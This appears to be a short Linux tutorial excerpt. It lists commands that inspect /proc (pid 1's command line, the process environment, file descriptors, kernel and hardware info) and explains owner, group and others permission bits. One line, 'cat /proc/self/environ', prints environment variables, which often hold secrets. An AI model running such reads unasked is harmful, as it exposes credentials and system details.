cat /proc/1/cmdline | tr '\0' ' '          # pid 1 (init/systemd) command
cat /proc/self/environ | tr '\0' '\n'      # your environment
ls -la /proc/self/fd                       # your open file descriptors
cat /proc/version                          # kernel version
cat /proc/cpuinfo
cat /proc/meminfo file permissions every file and directory has an owner (user), an owning group, and three sets of permissions: **owner**, **group**, **others**. -rwxr-xr--  1  alice  devs  4096  jun 4  script.sh
│└┬┘└┬┘└┬┘
│ │  │  └── others: read only (r--)
│ │  └───── group:  read + execute (r-x)
│ └──────── owner:  read + write + execute (rwx)
